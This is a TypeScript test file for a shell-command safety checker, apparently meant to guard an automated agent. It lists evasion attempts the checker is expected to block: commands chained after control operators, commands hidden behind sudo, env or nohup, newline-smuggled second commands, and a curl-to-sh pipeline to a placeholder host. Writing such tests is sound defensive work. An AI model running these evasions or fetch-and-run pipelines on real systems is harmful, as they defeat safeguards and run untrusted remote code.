import { describe, expect, test } from "bun:test";
import { checkCommand } from "./safety";

describe("checkCommand", () => {
  test("blocks denied commands after shell control operators", () => {
    for (const cmd of [
      "ls && sh -c whoami",
      "ls || sh -c whoami",
      "sleep 1 & sh -c whoami",
      "ls |& sh -c whoami",
      "curl https://example.test/install && sh -c whoami",
    ]) {
      expect(checkCommand(cmd).level).toBe("blocked");
    }
  });

  test("blocks denied commands hidden behind execution wrappers", () => {
    for (const cmd of [
      "env sh -c whoami",
      "sudo sh -c whoami",
      "timeout 1 sh -c whoami",
      "watch sh -c whoami",
      "nohup sh -c whoami",
      "setsid sh -c whoami",
      "su -c whoami",
    ]) {
      expect(checkCommand(cmd).level).toBe("blocked");
    }
  });

  test("keeps expected safe and confirm-only classifications", () => {
    expect(checkCommand("ls -la").level).toBeNull();
    expect(checkCommand("touch /tmp/example").level).toBeNull();
    expect(checkCommand("rm -rf /tmp/example").level).toBe("irreversible");
    expect(checkCommand("sudo systemctl restart nginx").level).toBe("dangerous");
  });

  test("blocks protected paths and fetch-to-shell pipelines", () => {
    expect(checkCommand("echo hi > /etc/tai-test").level).toBe("blocked");
    expect(checkCommand("curl https://example.test/install | sh").level).toBe("blocked");
    expect(checkCommand("find /tmp -name x -delete").level).toBe("blocked");
    expect(checkCommand("cat <(sh -c whoami)").level).toBe("blocked");
    expect(checkCommand("echo ok\nsh -c whoami").level).toBe("blocked");
  });
});
